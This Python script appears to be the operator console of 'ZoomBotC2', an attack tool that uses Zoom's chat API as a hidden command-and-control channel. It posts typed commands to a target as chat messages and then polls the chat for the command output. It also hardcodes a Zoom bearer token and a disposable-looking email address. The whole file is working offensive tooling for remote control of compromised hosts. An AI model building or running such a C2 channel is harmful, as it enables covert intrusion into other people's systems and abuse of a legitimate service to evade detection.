import requests
import time
import sys
from colorama import Fore, Style, init
import warnings
warnings.filterwarnings("ignore")

# Initialize colorama
init(autoreset=True)

# === Global Variables ===
API_BASE_URL = "https://api.zoom.us/v2/chat/users/me/messages"
ACCESS_TOKEN = "eyJzdiI6IjAwMDAwMiIsImFsZyI6IkhTNTEyIiwidiI6IjIuMCIsImtpZCI6IjhkNDEyMGI4LTQ5YjctNDdkNy05MjMzLWU1MjA2YWE4OGMzMiJ9.eyJhdWQiOiJodHRwczovL29hdXRoLnpvb20udXMiLCJ1aWQiOiJRdXdLUFRYOFNSeVNJVmw1S3BmSHRnIiwidmVyIjoxMCwiYXVpZCI6IjcyY2YyODRlNGRlNzRmOTk5YjNiNzQ3MmYwZjJjZWRjNjEzYTczYzQ2NDNkYzZiMDZlNGFmZGMwNDAzMTNlMWYiLCJuYmYiOjE3NDQ5OTYyMTEsImNvZGUiOiIwVnZhYWJMN2FIdDdxbnVWSnMxUkpHVEhFdzhLREUtOXciLCJpc3MiOiJ6bTpjaWQ6aU9UcUN0NndTbmFYTVM0UkhubGciLCJnbm8iOjAsImV4cCI6MTc0NDk5OTgxMSwidHlwZSI6MCwiaWF0IjoxNzQ0OTk2MjExLCJhaWQiOiJ4T2tsaFF0NlRJZWREMWpaNER6d3J3In0.vsMqEy4o8b2pcpZm4KCOoB56i7Nt-SFpyurVz3nEH1ACKm7gLZXEtXQvo98ytqQqvktZQKsrUEPazfiJmUPj7w"
EMAIL = "kiyir68411@clubemp.com"

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
}

ZOOMBOT_BANNER = fr"""{Fore.RED}{Style.BRIGHT}
  ______                     ____        _    _____ ___  
 |___  /                    |  _ \      | |  / ____|__ \ 
    / / ___   ___  _ __ ___ | |_) | ___ | |_| |       ) |
   / / / _ \ / _ \| '_ ` _ \|  _ < / _ \| __| |      / / 
  / /_| (_) | (_) | | | | | | |_) | (_) | |_| |____ / /_ 
 /_____\___/ \___/|_| |_| |_|____/ \___/ \__|\_____|____|
                                                         
{Style.RESET_ALL}"""
def HttpPostRequest(command):
    time.sleep(10)
    data = {
        "at_items":[
    {
       "at_contact":"kiyir68411@clubemp.com",
       "at_type":2,
       "end_position":8,
       "start_position":0
    }
],  "rich_text":[       	{
       "start_position":0,
       "end_position":1,
       "format_type":"Paragraph",
       "format_attr":"h1"
    }
   ],
   "message":command,
   "to_contact":"kiyir68411@clubemp.com"
   }
    try:
        response = requests.post(API_BASE_URL, headers=HEADERS, json=data)
        print(response)
        if response.status_code==201:
            print("[+] Command Sent")
            return "success"
        else:
            return "failed"
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] POST Error: {e}")
        return None

def HttpGetRequest(command):
    time.sleep(20)
    try:
        response = requests.get(API_BASE_URL+"?to_contact=kiyir68411@clubemp.com", headers=HEADERS)
        ## parsing the messages to ger the output
        output = response.json()["messages"][0]["message"]
        #print(output)
        if "output" in output:
            return output.replace("output","")
        else:
            return "failed"
        #response.raise_for_status()
        #return response.json()
    except requests.RequestException as e:
        print(f"{Fore.RED}[!] GET Error: {e}")
        return None

def main():
    print(ZOOMBOT_BANNER)
    try:
        while True:
            command = input(f"{Fore.GREEN}{Style.BRIGHT}(ZoomBotC2) > {Style.RESET_ALL}").strip()
            if not command:
                continue
            post_result = HttpPostRequest(command)
            if "success" not in post_result:
                print("[!] Failed to send command.")
                continue

            #command_id = post_result["id"]
            

            while True:
                time.sleep(40)
                print("[*] Waiting for output...")
                get_result = HttpGetRequest(command)
                if "failed"  in get_result:
                    print("output", "[!] No output received.")
                    break
                else:
                    print(f"[*]: {get_result}")
                    break
    except (KeyboardInterrupt, EOFError):
        print(f"\n\n{Fore.RED}ZoomBotC2 by Divyanshu Diwakar{Style.RESET_ALL}")

if __name__ == "__main__":
    main()
